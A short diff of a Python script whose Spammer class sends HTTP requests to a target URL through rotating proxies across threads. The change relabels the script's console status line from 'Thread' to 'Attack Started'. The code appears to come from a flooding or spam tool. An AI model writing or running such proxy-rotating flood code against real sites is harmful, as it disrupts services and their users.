@@ -168,7 +168,7 @@ class Spammer(threading.Thread):
         urllib.request.install_opener(opener) 
         req = urllib.request.Request(self.url, data, self.headers)
         urllib.request.urlopen(req)
-        sys.stdout.write("\x1b[38;5;228mLucifer\x1b[38;5;255m@\x1b[38;5;207mThread #%4d | %4d\%d | Proxy@%s"%(self.num, N, len(self.lista), self.lista[N]))
+        sys.stdout.write("\x1b[38;5;228mLucifer\x1b[38;5;255m@\x1b[38;5;207mAttack Started #%4d | %4d\%d | Proxy@%s"%(self.num, N, len(self.lista), self.lista[N]))
     def run(self):
         global N
         self.Lock.acquire()
